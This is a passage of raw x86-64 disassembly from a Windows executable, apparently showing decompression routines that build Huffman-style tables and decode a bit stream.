   140003946:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000394d:	4c 8b cb             	mov    %rbx,%r9
   140003950:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003954:	48 8b d5             	mov    %rbp,%rdx
   140003957:	49 8b ce             	mov    %r14,%rcx
   14000395a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000395f:	e8 cc f4 ff ff       	call   0x140002e30
   140003964:	48 83 c4 30          	add    $0x30,%rsp
   140003968:	41 5e                	pop    %r14
   14000396a:	5f                   	pop    %rdi
   14000396b:	5e                   	pop    %rsi
   14000396c:	5d                   	pop    %rbp
   14000396d:	5b                   	pop    %rbx
   14000396e:	c3                   	ret
   14000396f:	cc                   	int3
   140003970:	40 53                	rex push %rbx
   140003972:	55                   	push   %rbp
   140003973:	57                   	push   %rdi
   140003974:	41 54                	push   %r12
   140003976:	48 81 ec b8 02 00 00 	sub    $0x2b8,%rsp
   14000397d:	48 8b 05 7c 46 37 01 	mov    0x137467c(%rip),%rax        # 0x141378000
   140003984:	48 33 c4             	xor    %rsp,%rax
   140003987:	48 89 84 24 90 02 00 	mov    %rax,0x290(%rsp)
   14000398e:	00 
   14000398f:	48 81 bc 24 00 03 00 	cmpq   $0x5dc,0x300(%rsp)
   140003996:	00 dc 05 00 00 
   14000399b:	49 8b d9             	mov    %r9,%rbx
   14000399e:	8b 39                	mov    (%rcx),%edi
   1400039a0:	49 8b c0             	mov    %r8,%rax
   1400039a3:	48 89 9c 24 90 00 00 	mov    %rbx,0x90(%rsp)
   1400039aa:	00 
   1400039ab:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   1400039b2:	00 
   1400039b3:	89 7c 24 7c          	mov    %edi,0x7c(%rsp)
   1400039b7:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   1400039bb:	0f 82 2a 05 00 00    	jb     0x140003eeb
   1400039c1:	4d 8d 81 70 02 00 00 	lea    0x270(%r9),%r8
   1400039c8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400039cb:	41 0f 11 00          	movups %xmm0,(%r8)
   1400039cf:	41 0f 11 40 10       	movups %xmm0,0x10(%r8)
   1400039d4:	41 0f 11 40 20       	movups %xmm0,0x20(%r8)
   1400039d9:	41 0f 11 40 30       	movups %xmm0,0x30(%r8)
   1400039de:	41 0f 11 40 40       	movups %xmm0,0x40(%r8)
   1400039e3:	41 0f 11 40 50       	movups %xmm0,0x50(%r8)
   1400039e8:	41 0f 11 40 5c       	movups %xmm0,0x5c(%r8)
   1400039ed:	40 80 ff 0c          	cmp    $0xc,%dil
   1400039f1:	0f 87 f4 04 00 00    	ja     0x140003eeb
   1400039f7:	49 8d 89 dc 04 00 00 	lea    0x4dc(%r9),%rcx
   1400039fe:	4c 8d 8c 24 20 01 00 	lea    0x120(%rsp),%r9
   140003a05:	00 
   140003a06:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   140003a0b:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   140003a10:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003a15:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140003a1a:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140003a1f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003a24:	e8 f7 eb ff ff       	call   0x140002620
   140003a29:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   140003a30:	00 
   140003a31:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140003a35:	0f 87 b7 04 00 00    	ja     0x140003ef2
   140003a3b:	8b 6c 24 58          	mov    0x58(%rsp),%ebp
   140003a3f:	44 0f b6 e7          	movzbl %dil,%r12d
   140003a43:	44 89 64 24 68       	mov    %r12d,0x68(%rsp)
   140003a48:	41 3b ec             	cmp    %r12d,%ebp
   140003a4b:	0f 87 9a 04 00 00    	ja     0x140003eeb
   140003a51:	83 bc ab 70 02 00 00 	cmpl   $0x0,0x270(%rbx,%rbp,4)
   140003a58:	00 
   140003a59:	44 8b dd             	mov    %ebp,%r11d
   140003a5c:	48 89 b4 24 f0 02 00 	mov    %rsi,0x2f0(%rsp)
   140003a63:	00 
   140003a64:	4c 89 b4 24 a8 02 00 	mov    %r14,0x2a8(%rsp)
   140003a6b:	00 
   140003a6c:	4c 89 bc 24 a0 02 00 	mov    %r15,0x2a0(%rsp)
   140003a73:	00 
   140003a74:	75 18                	jne    0x140003a8e
   140003a76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003a7d:	00 00 00 
   140003a80:	41 ff cb             	dec    %r11d
   140003a83:	42 83 bc 9b 70 02 00 	cmpl   $0x0,0x270(%rbx,%r11,4)
   140003a8a:	00 00 
   140003a8c:	74 f2                	je     0x140003a80
   140003a8e:	45 33 f6             	xor    %r14d,%r14d
   140003a91:	45 8d 53 01          	lea    0x1(%r11),%r10d
   140003a95:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140003a9b:	44 89 74 24 64       	mov    %r14d,0x64(%rsp)
   140003aa0:	41 8b d7             	mov    %r15d,%edx
   140003aa3:	44 3b d2             	cmp    %edx,%r10d
   140003aa6:	76 28                	jbe    0x140003ad0
   140003aa8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003aaf:	00 
   140003ab0:	8b c2                	mov    %edx,%eax
   140003ab2:	41 8b ce             	mov    %r14d,%ecx
   140003ab5:	ff c2                	inc    %edx
   140003ab7:	44 03 b4 83 70 02 00 	add    0x270(%rbx,%rax,4),%r14d
   140003abe:	00 
   140003abf:	89 8c 83 a8 02 00 00 	mov    %ecx,0x2a8(%rbx,%rax,4)
   140003ac6:	41 3b d2             	cmp    %r10d,%edx
   140003ac9:	72 e5                	jb     0x140003ab0
   140003acb:	44 89 74 24 64       	mov    %r14d,0x64(%rsp)
   140003ad0:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   140003ad5:	33 ff                	xor    %edi,%edi
   140003ad7:	44 89 b3 a8 02 00 00 	mov    %r14d,0x2a8(%rbx)
   140003ade:	45 85 c0             	test   %r8d,%r8d
   140003ae1:	74 3c                	je     0x140003b1f
   140003ae3:	0f 1f 40 00          	nopl   0x0(%rax)
   140003ae7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003aee:	00 00 
   140003af0:	0f b6 94 3b dc 04 00 	movzbl 0x4dc(%rbx,%rdi,1),%edx
   140003af7:	00 
   140003af8:	8b 8c 93 a8 02 00 00 	mov    0x2a8(%rbx,%rdx,4),%ecx
   140003aff:	8d 41 01             	lea    0x1(%rcx),%eax
   140003b02:	89 84 93 a8 02 00 00 	mov    %eax,0x2a8(%rbx,%rdx,4)
   140003b09:	40 88 bc 4b dc 02 00 	mov    %dil,0x2dc(%rbx,%rcx,2)
   140003b10:	00 
   140003b11:	ff c7                	inc    %edi
   140003b13:	88 94 4b dd 02 00 00 	mov    %dl,0x2dd(%rbx,%rcx,2)
   140003b1a:	41 3b f8             	cmp    %r8d,%edi
   140003b1d:	72 d1                	jb     0x140003af0
   140003b1f:	41 8b f4             	mov    %r12d,%esi
   140003b22:	c7 83 a8 02 00 00 00 	movl   $0x0,0x2a8(%rbx)
   140003b29:	00 00 00 
   140003b2c:	2b f5                	sub    %ebp,%esi
   140003b2e:	45 33 c9             	xor    %r9d,%r9d
   140003b31:	45 8b c7             	mov    %r15d,%r8d
   140003b34:	45 3b d7             	cmp    %r15d,%r10d
   140003b37:	76 2a                	jbe    0x140003b63
   140003b39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003b40:	41 8b d0             	mov    %r8d,%edx
   140003b43:	8d 4e ff             	lea    -0x1(%rsi),%ecx
   140003b46:	41 03 c8             	add    %r8d,%ecx
   140003b49:	41 8b f9             	mov    %r9d,%edi
   140003b4c:	41 ff c0             	inc    %r8d
   140003b4f:	8b 84 93 70 02 00 00 	mov    0x270(%rbx,%rdx,4),%eax
   140003b56:	d3 e0                	shl    %cl,%eax
   140003b58:	44 03 c8             	add    %eax,%r9d
   140003b5b:	89 3c 93             	mov    %edi,(%rbx,%rdx,4)
   140003b5e:	45 3b c2             	cmp    %r10d,%r8d
   140003b61:	72 dd                	jb     0x140003b40
   140003b63:	44 8b cd             	mov    %ebp,%r9d
   140003b66:	41 8b f4             	mov    %r12d,%esi
   140003b69:	45 2b cb             	sub    %r11d,%r9d
   140003b6c:	41 ff c1             	inc    %r9d
   140003b6f:	41 2b f1             	sub    %r9d,%esi
   140003b72:	ff c6                	inc    %esi
   140003b74:	44 3b ce             	cmp    %esi,%r9d
   140003b77:	0f 83 c7 00 00 00    	jae    0x140003c44
   140003b7d:	0f 1f 00             	nopl   (%rax)
   140003b80:	66 41 0f 6e c9       	movd   %r9d,%xmm1
   140003b85:	45 3b d7             	cmp    %r15d,%r10d
   140003b88:	0f 86 aa 00 00 00    	jbe    0x140003c38
   140003b8e:	41 8b c1             	mov    %r9d,%eax
   140003b91:	41 8b ff             	mov    %r15d,%edi
   140003b94:	4c 6b c0 34          	imul   $0x34,%rax,%r8
   140003b98:	4c 03 c3             	add    %rbx,%r8
   140003b9b:	41 83 fb 10          	cmp    $0x10,%r11d
   140003b9f:	0f 82 7e 00 00 00    	jb     0x140003c23
   140003ba5:	41 8b d3             	mov    %r11d,%edx
   140003ba8:	49 8d 40 04          	lea    0x4(%r8),%rax
   140003bac:	48 8d 0c 93          	lea    (%rbx,%rdx,4),%rcx
   140003bb0:	48 3b c1             	cmp    %rcx,%rax
   140003bb3:	77 0d                	ja     0x140003bc2
   140003bb5:	49 8d 0c 90          	lea    (%r8,%rdx,4),%rcx
   140003bb9:	48 8d 43 04          	lea    0x4(%rbx),%rax
   140003bbd:	48 3b c8             	cmp    %rax,%rcx
   140003bc0:	73 61                	jae    0x140003c23
   140003bc2:	41 8b c3             	mov    %r11d,%eax
   140003bc5:	41 8b d2             	mov    %r10d,%edx
   140003bc8:	83 e0 0f             	and    $0xf,%eax
   140003bcb:	2b d0                	sub    %eax,%edx
   140003bcd:	0f 1f 00             	nopl   (%rax)
   140003bd0:	8b c7                	mov    %edi,%eax
   140003bd2:	f3 0f 6f 04 83       	movdqu (%rbx,%rax,4),%xmm0
   140003bd7:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003bdb:	f3 41 0f 7f 04 80    	movdqu %xmm0,(%r8,%rax,4)
   140003be1:	8d 47 04             	lea    0x4(%rdi),%eax
   140003be4:	f3 0f 6f 04 83       	movdqu (%rbx,%rax,4),%xmm0
   140003be9:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003bed:	f3 41 0f 7f 04 80    	movdqu %xmm0,(%r8,%rax,4)
   140003bf3:	8d 47 08             	lea    0x8(%rdi),%eax
   140003bf6:	f3 0f 6f 04 83       	movdqu (%rbx,%rax,4),%xmm0
   140003bfb:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003bff:	f3 41 0f 7f 04 80    	movdqu %xmm0,(%r8,%rax,4)
   140003c05:	8d 47 0c             	lea    0xc(%rdi),%eax
   140003c08:	83 c7 10             	add    $0x10,%edi
   140003c0b:	f3 0f 6f 04 83       	movdqu (%rbx,%rax,4),%xmm0
   140003c10:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003c14:	f3 41 0f 7f 04 80    	movdqu %xmm0,(%r8,%rax,4)
   140003c1a:	3b fa                	cmp    %edx,%edi
   140003c1c:	72 b2                	jb     0x140003bd0
   140003c1e:	41 3b fa             	cmp    %r10d,%edi
   140003c21:	73 15                	jae    0x140003c38
   140003c23:	8b d7                	mov    %edi,%edx
   140003c25:	41 8b c9             	mov    %r9d,%ecx
   140003c28:	ff c7                	inc    %edi
   140003c2a:	8b 04 93             	mov    (%rbx,%rdx,4),%eax
   140003c2d:	d3 e8                	shr    %cl,%eax
   140003c2f:	41 89 04 90          	mov    %eax,(%r8,%rdx,4)
   140003c33:	41 3b fa             	cmp    %r10d,%edi
   140003c36:	72 eb                	jb     0x140003c23
   140003c38:	41 ff c1             	inc    %r9d
   140003c3b:	44 3b ce             	cmp    %esi,%r9d
   140003c3e:	0f 82 3c ff ff ff    	jb     0x140003b80
   140003c44:	0f 10 03             	movups (%rbx),%xmm0
   140003c47:	8b 43 30             	mov    0x30(%rbx),%eax
   140003c4a:	44 8d 4d 01          	lea    0x1(%rbp),%r9d
   140003c4e:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140003c52:	41 8b f9             	mov    %r9d,%edi
   140003c55:	41 8b d1             	mov    %r9d,%edx
   140003c58:	41 2b fc             	sub    %r12d,%edi
   140003c5b:	89 84 24 10 01 00 00 	mov    %eax,0x110(%rsp)
   140003c62:	41 2b d3             	sub    %r11d,%edx
   140003c65:	44 89 4c 24 54       	mov    %r9d,0x54(%rsp)
   140003c6a:	33 c0                	xor    %eax,%eax
   140003c6c:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   140003c70:	89 54 24 74          	mov    %edx,0x74(%rsp)
   140003c74:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140003c78:	0f 11 84 24 e0 00 00 	movups %xmm0,0xe0(%rsp)
   140003c7f:	00 
   140003c80:	0f 10 43 20          	movups 0x20(%rbx),%xmm0
   140003c84:	0f 11 8c 24 f0 00 00 	movups %xmm1,0xf0(%rsp)
   140003c8b:	00 
   140003c8c:	0f 11 84 24 00 01 00 	movups %xmm0,0x100(%rsp)
   140003c93:	00 
   140003c94:	45 85 f6             	test   %r14d,%r14d
   140003c97:	0f 84 11 02 00 00    	je     0x140003eae
   140003c9d:	4c 89 ac 24 b0 02 00 	mov    %r13,0x2b0(%rsp)
   140003ca4:	00 
   140003ca5:	0f b6 8c 43 dd 02 00 	movzbl 0x2dd(%rbx,%rax,2),%ecx
   140003cac:	00 
   140003cad:	41 8b f1             	mov    %r9d,%esi
   140003cb0:	44 0f b6 ac 43 dc 02 	movzbl 0x2dc(%rbx,%rax,2),%r13d
   140003cb7:	00 00 
   140003cb9:	2b f1                	sub    %ecx,%esi
   140003cbb:	48 8d 84 24 e0 00 00 	lea    0xe0(%rsp),%rax
   140003cc2:	00 
   140003cc3:	44 8b 3c 88          	mov    (%rax,%rcx,4),%r15d
   140003cc7:	48 8d 04 88          	lea    (%rax,%rcx,4),%rax
   140003ccb:	41 8b cc             	mov    %r12d,%ecx
   140003cce:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   140003cd5:	00 
   140003cd6:	2b ce                	sub    %esi,%ecx
   140003cd8:	44 89 7c 24 6c       	mov    %r15d,0x6c(%rsp)
   140003cdd:	b8 01 00 00 00       	mov    $0x1,%eax
   140003ce2:	44 8b e0             	mov    %eax,%r12d
   140003ce5:	41 d3 e4             	shl    %cl,%r12d
   140003ce8:	44 89 64 24 70       	mov    %r12d,0x70(%rsp)
   140003ced:	3b ca                	cmp    %edx,%ecx
   140003cef:	0f 82 52 01 00 00    	jb     0x140003e47
   140003cf5:	8d 0c 3e             	lea    (%rsi,%rdi,1),%ecx
   140003cf8:	48 8b bc 24 80 00 00 	mov    0x80(%rsp),%rdi
   140003cff:	00 
   140003d00:	3b c8                	cmp    %eax,%ecx
   140003d02:	0f 4c c8             	cmovl  %eax,%ecx
   140003d05:	4e 8d 14 bf          	lea    (%rdi,%r15,4),%r10
   140003d09:	44 8b 84 8b a4 02 00 	mov    0x2a4(%rbx,%rcx,4),%r8d
   140003d10:	00 
   140003d11:	49 8d 80 6e 01 00 00 	lea    0x16e(%r8),%rax
   140003d18:	48 8d 04 43          	lea    (%rbx,%rax,2),%rax
   140003d1c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140003d23:	00 
   140003d24:	8b c6                	mov    %esi,%eax
   140003d26:	48 6b c0 34          	imul   $0x34,%rax,%rax
   140003d2a:	0f 10 04 18          	movups (%rax,%rbx,1),%xmm0
   140003d2e:	0f 10 4c 18 10       	movups 0x10(%rax,%rbx,1),%xmm1
   140003d33:	0f 11 84 24 a8 00 00 	movups %xmm0,0xa8(%rsp)
   140003d3a:	00 
   140003d3b:	0f 10 44 18 20       	movups 0x20(%rax,%rbx,1),%xmm0
   140003d40:	8b 44 18 30          	mov    0x30(%rax,%rbx,1),%eax
   140003d44:	89 84 24 d8 00 00 00 	mov    %eax,0xd8(%rsp)
   140003d4b:	0f 11 84 24 c8 00 00 	movups %xmm0,0xc8(%rsp)
   140003d52:	00 
   140003d53:	0f 11 8c 24 b8 00 00 	movups %xmm1,0xb8(%rsp)
   140003d5a:	00 
   140003d5b:	83 f9 01             	cmp    $0x1,%ecx
   140003d5e:	76 27                	jbe    0x140003d87
   140003d60:	8b 84 8c a8 00 00 00 	mov    0xa8(%rsp,%rcx,4),%eax
   140003d67:	66 44 89 6c 24 50    	mov    %r13w,0x50(%rsp)
   140003d6d:	40 88 74 24 52       	mov    %sil,0x52(%rsp)
   140003d72:	c6 44 24 53 01       	movb   $0x1,0x53(%rsp)
   140003d77:	85 c0                	test   %eax,%eax
   140003d79:	74 0c                	je     0x140003d87
   140003d7b:	8b c8                	mov    %eax,%ecx
   140003d7d:	49 8d 7a 04          	lea    0x4(%r10),%rdi
   140003d81:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140003d85:	f3 ab                	rep stos %eax,(%rdi)
   140003d87:	41 8b ee             	mov    %r14d,%ebp
   140003d8a:	41 bb 00 00 00 00    	mov    $0x0,%r11d
   140003d90:	41 2b e8             	sub    %r8d,%ebp
   140003d93:	0f 84 df 00 00 00    	je     0x140003e78
   140003d99:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140003da0:	00 
   140003da1:	44 8b 64 24 54       	mov    0x54(%rsp),%r12d
   140003da6:	44 8b 7c 24 68       	mov    0x68(%rsp),%r15d
   140003dab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003db0:	41 8b fb             	mov    %r11d,%edi
   140003db3:	4c 8d b4 24 a8 00 00 	lea    0xa8(%rsp),%r14
   140003dba:	00 
   140003dbb:	45 8b c4             	mov    %r12d,%r8d
   140003dbe:	c6 44 24 53 02       	movb   $0x2,0x53(%rsp)
   140003dc3:	41 8b cf             	mov    %r15d,%ecx
   140003dc6:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003dcc:	0f b6 44 7b 01       	movzbl 0x1(%rbx,%rdi,2),%eax
   140003dd1:	41 8b 14 86          	mov    (%r14,%rax,4),%edx
   140003dd5:	4d 8d 34 86          	lea    (%r14,%rax,4),%r14
   140003dd9:	44 2b c0             	sub    %eax,%r8d
   140003ddc:	0f b6 04 7b          	movzbl (%rbx,%rdi,2),%eax
   140003de0:	66 c1 e0 08          	shl    $0x8,%ax
   140003de4:	41 2b c8             	sub    %r8d,%ecx
   140003de7:	2b ce                	sub    %esi,%ecx
   140003de9:	41 d3 e1             	shl    %cl,%r9d
   140003dec:	44 03 ca             	add    %edx,%r9d
   140003def:	66 41 0b c5          	or     %r13w,%ax
   140003df3:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   140003df8:	41 8d 04 30          	lea    (%r8,%rsi,1),%eax
   140003dfc:	88 44 24 52          	mov    %al,0x52(%rsp)
   140003e00:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140003e04:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003e0f:	00 
   140003e10:	8b ca                	mov    %edx,%ecx
   140003e12:	ff c2                	inc    %edx
   140003e14:	41 89 44 8a 04       	mov    %eax,0x4(%r10,%rcx,4)
   140003e19:	41 3b d1             	cmp    %r9d,%edx
   140003e1c:	72 f2                	jb     0x140003e10
   140003e1e:	41 ff c3             	inc    %r11d
   140003e21:	45 89 0e             	mov    %r9d,(%r14)
   140003e24:	44 3b dd             	cmp    %ebp,%r11d
   140003e27:	72 87                	jb     0x140003db0
   140003e29:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140003e30:	00 
   140003e31:	44 8b 7c 24 6c       	mov    0x6c(%rsp),%r15d
   140003e36:	44 8b 64 24 70       	mov    0x70(%rsp),%r12d
   140003e3b:	44 8b 74 24 64       	mov    0x64(%rsp),%r14d
   140003e40:	44 8b 4c 24 54       	mov    0x54(%rsp),%r9d
   140003e45:	eb 31                	jmp    0x140003e78
   140003e47:	88 44 24 5f          	mov    %al,0x5f(%rsp)
   140003e4b:	43 8d 04 3c          	lea    (%r12,%r15,1),%eax
   140003e4f:	66 44 89 6c 24 5c    	mov    %r13w,0x5c(%rsp)
   140003e55:	40 88 74 24 5e       	mov    %sil,0x5e(%rsp)
   140003e5a:	44 3b f8             	cmp    %eax,%r15d
   140003e5d:	73 19                	jae    0x140003e78
   140003e5f:	48 8b 94 24 80 00 00 	mov    0x80(%rsp),%rdx
   140003e66:	00 
   140003e67:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   140003e6b:	48 83 c2 04          	add    $0x4,%rdx
   140003e6f:	41 8b cc             	mov    %r12d,%ecx
   140003e72:	4a 8d 3c ba          	lea    (%rdx,%r15,4),%rdi
   140003e76:	f3 ab                	rep stos %eax,(%rdi)
   140003e78:	48 8b 94 24 98 00 00 	mov    0x98(%rsp),%rdx
   140003e7f:	00 
   140003e80:	43 8d 0c 27          	lea    (%r15,%r12,1),%ecx
   140003e84:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140003e88:	8b 7c 24 78          	mov    0x78(%rsp),%edi
   140003e8c:	ff c0                	inc    %eax
   140003e8e:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
   140003e93:	89 0a                	mov    %ecx,(%rdx)
   140003e95:	8b 54 24 74          	mov    0x74(%rsp),%edx
   140003e99:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140003e9d:	41 3b c6             	cmp    %r14d,%eax
   140003ea0:	0f 82 ff fd ff ff    	jb     0x140003ca5
   140003ea6:	4c 8b ac 24 b0 02 00 	mov    0x2b0(%rsp),%r13
   140003ead:	00 
   140003eae:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140003eb5:	00 
   140003eb6:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140003eba:	4c 8b bc 24 a0 02 00 	mov    0x2a0(%rsp),%r15
   140003ec1:	00 
   140003ec2:	4c 8b b4 24 a8 02 00 	mov    0x2a8(%rsp),%r14
   140003ec9:	00 
   140003eca:	48 8b b4 24 f0 02 00 	mov    0x2f0(%rsp),%rsi
   140003ed1:	00 
   140003ed2:	88 4c 24 62          	mov    %cl,0x62(%rsp)
   140003ed6:	c6 44 24 61 01       	movb   $0x1,0x61(%rsp)
   140003edb:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   140003edf:	89 08                	mov    %ecx,(%rax)
   140003ee1:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140003ee8:	00 
   140003ee9:	eb 07                	jmp    0x140003ef2
   140003eeb:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   140003ef2:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   140003ef9:	00 
   140003efa:	48 33 cc             	xor    %rsp,%rcx
   140003efd:	e8 1e 87 00 00       	call   0x14000c620
   140003f02:	48 81 c4 b8 02 00 00 	add    $0x2b8,%rsp
   140003f09:	41 5c                	pop    %r12
   140003f0b:	5f                   	pop    %rdi
   140003f0c:	5d                   	pop    %rbp
   140003f0d:	5b                   	pop    %rbx
   140003f0e:	c3                   	ret
   140003f0f:	cc                   	int3
   140003f10:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003f15:	53                   	push   %rbx
   140003f16:	48 83 ec 70          	sub    $0x70,%rsp
   140003f1a:	49 8b c0             	mov    %r8,%rax
   140003f1d:	48 8b da             	mov    %rdx,%rbx
   140003f20:	4c 8b d9             	mov    %rcx,%r11
   140003f23:	48 8b d0             	mov    %rax,%rdx
   140003f26:	4d 8b c1             	mov    %r9,%r8
   140003f29:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003f2e:	e8 ed d1 ff ff       	call   0x140001120
   140003f33:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140003f37:	0f 87 18 03 00 00    	ja     0x140004255
   140003f3d:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140003f42:	4d 8d 14 1b          	lea    (%r11,%rbx,1),%r10
   140003f46:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140003f4b:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140003f52:	00 
   140003f53:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140003f58:	48 89 b4 24 90 00 00 	mov    %rsi,0x90(%rsp)
   140003f5f:	00 
   140003f60:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140003f67:	00 
   140003f68:	48 89 bc 24 98 00 00 	mov    %rdi,0x98(%rsp)
   140003f6f:	00 
   140003f70:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140003f75:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140003f7a:	4d 8d 62 f9          	lea    -0x7(%r10),%r12
   140003f7e:	8b 06                	mov    (%rsi),%eax
   140003f80:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   140003f85:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140003f8a:	41 be 3f 00 00 00    	mov    $0x3f,%r14d
   140003f90:	c1 e8 10             	shr    $0x10,%eax
   140003f93:	44 0f b6 e8          	movzbl %al,%r13d
   140003f97:	45 2b f5             	sub    %r13d,%r14d
   140003f9a:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140003f9f:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   140003fa4:	41 ff c6             	inc    %r14d
   140003fa7:	41 83 e6 3f          	and    $0x3f,%r14d
   140003fab:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003fb0:	41 83 f8 40          	cmp    $0x40,%r8d
   140003fb4:	76 07                	jbe    0x140003fbd
   140003fb6:	ba 03 00 00 00       	mov    $0x3,%edx
   140003fbb:	eb 57                	jmp    0x140004014
   140003fbd:	49 3b df             	cmp    %r15,%rbx
   140003fc0:	72 12                	jb     0x140003fd4
   140003fc2:	41 8b c0             	mov    %r8d,%eax
   140003fc5:	41 83 e0 07          	and    $0x7,%r8d
   140003fc9:	48 c1 e8 03          	shr    $0x3,%rax
   140003fcd:	48 2b d8             	sub    %rax,%rbx
   140003fd0:	33 d2                	xor    %edx,%edx
   140003fd2:	eb 3d                	jmp    0x140004011
   140003fd4:	48 3b dd             	cmp    %rbp,%rbx
   140003fd7:	75 0b                	jne    0x140003fe4
   140003fd9:	41 83 f8 40          	cmp    $0x40,%r8d
   140003fdd:	1b d2                	sbb    %edx,%edx
   140003fdf:	83 c2 02             	add    $0x2,%edx
   140003fe2:	eb 30                	jmp    0x140004014
   140003fe4:	41 8b c8             	mov    %r8d,%ecx
   140003fe7:	48 8b c3             	mov    %rbx,%rax
   140003fea:	c1 e9 03             	shr    $0x3,%ecx
   140003fed:	48 2b c1             	sub    %rcx,%rax
   140003ff0:	48 3b c5             	cmp    %rbp,%rax
   140003ff3:	73 0b                	jae    0x140004000
   140003ff5:	8b cb                	mov    %ebx,%ecx
   140003ff7:	ba 01 00 00 00       	mov    $0x1,%edx
   140003ffc:	2b cd                	sub    %ebp,%ecx
   140003ffe:	eb 02                	jmp    0x140004002
   140004000:	33 d2                	xor    %edx,%edx
   140004002:	8b c1                	mov    %ecx,%eax
   140004004:	48 2b d8             	sub    %rax,%rbx
   140004007:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   14000400e:	44 2b c0             	sub    %eax,%r8d
   140004011:	48 8b 3b             	mov    (%rbx),%rdi
   140004014:	33 c9                	xor    %ecx,%ecx
   140004016:	4d 3b dc             	cmp    %r12,%r11
   140004019:	0f 92 c1             	setb   %cl
   14000401c:	33 c0                	xor    %eax,%eax
   14000401e:	85 d2                	test   %edx,%edx
   140004020:	0f 94 c0             	sete   %al
   140004023:	85 c8                	test   %ecx,%eax
   140004025:	0f 84 ac 00 00 00    	je     0x1400040d7
   14000402b:	41 8b c8             	mov    %r8d,%ecx
   14000402e:	48 8b d7             	mov    %rdi,%rdx
   140004031:	48 d3 e2             	shl    %cl,%rdx
   140004034:	41 8b ce             	mov    %r14d,%ecx
   140004037:	48 d3 ea             	shr    %cl,%rdx
   14000403a:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   14000403f:	66 41 89 03          	mov    %ax,(%r11)
   140004043:	0f b6 44 96 06       	movzbl 0x6(%rsi,%rdx,4),%eax
   140004048:	44 0f b6 4c 96 07    	movzbl 0x7(%rsi,%rdx,4),%r9d
   14000404e:	44 03 c0             	add    %eax,%r8d
   140004051:	41 8b c8             	mov    %r8d,%ecx
   140004054:	4d 03 cb             	add    %r11,%r9
   140004057:	48 8b d7             	mov    %rdi,%rdx
   14000405a:	48 d3 e2             	shl    %cl,%rdx
   14000405d:	41 8b ce             	mov    %r14d,%ecx
   140004060:	48 d3 ea             	shr    %cl,%rdx
   140004063:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   140004068:	66 41 89 01          	mov    %ax,(%r9)
   14000406c:	44 0f b6 54 96 06    	movzbl 0x6(%rsi,%rdx,4),%r10d
   140004072:	45 03 d0             	add    %r8d,%r10d
   140004075:	44 0f b6 44 96 07    	movzbl 0x7(%rsi,%rdx,4),%r8d
   14000407b:	4d 03 c1             	add    %r9,%r8
   14000407e:	41 8b ca             	mov    %r10d,%ecx
   140004081:	48 8b d7             	mov    %rdi,%rdx
